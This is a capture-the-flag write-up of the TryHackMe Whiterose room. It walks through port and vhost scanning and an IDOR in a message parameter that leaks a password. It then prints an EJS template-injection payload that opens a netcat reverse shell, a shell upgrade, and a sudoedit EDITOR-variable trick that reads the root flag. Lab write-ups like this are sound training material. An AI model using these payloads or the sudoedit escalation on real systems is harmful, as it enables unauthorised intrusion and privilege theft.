---
title: TryHackMe Whiterose Writeup
date: 2024-11-03
tags: [tryhackme, ctf]
author: nandakishor
---
![alt text](../assets/images/whiterose/5f9c7574e201fe31dad228fc-1726214297023.png)
#WhiteRose
In my journey through the TryHackMe Whiterose challenge, I kicked things off with thorough enumeration using Rustscan and Nmap to uncover active ports and services on the target. This led me to investigate some interesting subdomains that eventually exposed potential entry points. As I explored further, I found crucial credentials and identified a vulnerable URL parameter, which I then leveraged to uncover sensitive data needed to access restricted areas of the website.
##recon
```
┌──(kali㉿kali)-[~/tmp]
└─$ rustscan -a 10.10.68.10 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.68.10:22
Open 10.10.68.10:80
^C
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ rustscan -a 10.10.68.10 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.68.10:22
Open 10.10.68.10:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sCV" on ip 
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCddbej9ZSf75uuDvLDeym5AYM+loP/3W862HTWjmksh0UuiuIz8UNTrf3ZpgtBej4y3E3EKvOmYFvJHZpFRV/hQBq1oZB3+XXVzb5RovazcnMgvFxI4y5nCQM8qTW09YvBOpzTyYmsKjVRJOfLR+F87g90vNdZ/u8uVl7IH0B6NmhGlCjPMVLRmhz7PuZih38t0WRWPruEY5qGliW0M3ngZXL6MmL1Jo146HtM8GASdt6yV9U3GLa3/OMFVjYgysqUQPrMwvUrQ8tIDnRAH1rsKBxDFotvcfW6mJ1OvojQf8PEw7iI/PNJZWGzkg+bm4/k+6PRjO2v/0V98DlU+gnn
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNMBr/zXjVQItMqdVH12/sZ3rIt2XFsPWRCy4bXCE7InUVg8Q9SVFkOW2LAi1UStP4A4W8yA8hW+1wJaEFP9ffs=
|   256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdJAkvDVqEAbac77yxYfkM0AU8puWxCyqCBJ9Pd9zCi
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Try to access the website
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 095753.png>)

add this subdomain to the etc/hosts
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 095921.png>)

I scaned for hidden directories but there is none , so i tried to enumerate subdomains

```
┌──(kali㉿kali)-[~/tmp]
└─$ gobuster vhost -u http://cyprusbank.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cyprusbank.thm/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cyprusbank.thm Status: 302 [Size: 28] [--> /login]
```

so add `admin.cyprusbank.thm` to etc/hosts
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 100339.png>)

Login with the creds theat given in this room 

`Olivia Cortez:olivi8`
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 100443.png>)


we have to find a phone number

![
](<../assets/images/whiterose/Screenshot 2024-11-03 100552.png>)


![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 100722.png>)

`http://admin.cyprusbank.thm/messages/?c=5`
the url is exploitable

so try to change the pointer value and get some info
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 100816.png>)

we can see a password

in `http://admin.cyprusbank.thm/messages/?c=0`

so login as `Gayle Bev`

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 100956.png>)

then you can find the phone number 

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 101130.png>)

Use SSTI vulnerability to get the shell

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 101552.png>)

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 101634.png>)

`http://local:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
`

modify this to exploit

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 102621.png>)
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 102635.png>)

so pass a reverse shell to it


![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 102825.png>)

save this to index.html and execute
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 103031.png>)

![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 103110.png>)


get the shell
![alt text](<../assets/images/whiterose/Screenshot 2024-11-03 103137.png>)


```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ export TERM=xterm
export TERM=xterm
web@cyprusbank:~/app$ ^Z
zsh: suspended  nc -nvlp 443
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ stty -raw echo; fg
[1]  + continued  nc -nvlp 443


web@cyprusbank:~/app$ 


```
upgrade the shell
```
web@cyprusbank:~$ cat user.txt
cat user.txt
THM{4lways_u*******p3nd3nc!3s}
web@cyprusbank:~$ 
```

```
web@cyprusbank:~$ sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
web@cyprusbank:~$ 
```

```
web@cyprusbank:~/app$ export EDITOR="cat -- /root/root.txt"
export EDITOR="cat -- /root/root.txt"
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
thmo sudoedit /etc/nginx/sites-available/admin.cyprusbank.t
sudo: sudoedit doesn't need to be run via sudo
sudo: --: editing files in a writable directory is not permitted
THM{4nd_flag***4g3s}
server {
  listen 80;
    
  server_name admin.cyprusbank.thm;
    
  location / {
    proxy_pass http://localhost:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
  }
}
sudo: /root/root.txt unchanged
sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
web@cyprusbank:~/app$ 
```
root flag `THM{4nd_flag***4g3s}`

